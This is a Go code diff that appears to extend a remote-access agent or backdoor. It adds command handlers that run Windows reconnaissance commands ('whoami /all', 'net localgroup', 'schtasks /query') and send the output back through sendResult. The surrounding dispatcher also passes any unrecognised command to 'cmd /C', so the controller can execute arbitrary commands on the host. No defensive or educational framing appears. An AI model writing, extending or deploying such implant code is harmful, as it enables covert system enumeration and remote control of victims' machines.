@@ -114,6 +114,12 @@ func executeCommandAndSendResult(cmd Command) {
         listShare(cmd)
     case cmd.Cmd == "list_drive":
         listDrive(cmd)
+    case cmd.Cmd == "whoami":
+        whoami(cmd)
+    case cmd.Cmd == "list_group":
+            listGroup(cmd)
+    case cmd.Cmd == "scheduled_task":
+            listScheduledTask(cmd)
     default:
         executeOtherCommand(cmd)
     }
@@ -205,6 +211,47 @@ func listDrive(cmd Command) {
         Result: resultText,
     })
 }
+
+func whoami(cmd Command) {
+    wmicCommand := "whoami /all"
+    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
+    resultText := string(output)
+    if err != nil {
+        resultText += "\nError: " + err.Error()
+    }
+    sendResult(CommandResult{
+        ID:     cmd.ID,
+        Result: resultText,
+    })
+}
+
+func listGroup(cmd Command) {
+    wmicCommand := "net localgroup"
+    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
+    resultText := string(output)
+    if err != nil {
+        resultText += "\nError: " + err.Error()
+    }
+    sendResult(CommandResult{
+        ID:     cmd.ID,
+        Result: resultText,
+    })
+}
+
+
+func listScheduledTask(cmd Command) {
+    wmicCommand := "schtasks /query /fo LIST /v"
+    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
+    resultText := string(output)
+    if err != nil {
+        resultText += "\nError: " + err.Error()
+    }
+    sendResult(CommandResult{
+        ID:     cmd.ID,
+        Result: resultText,
+    })
+}
+
 
 func executeOtherCommand(cmd Command) {
     output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
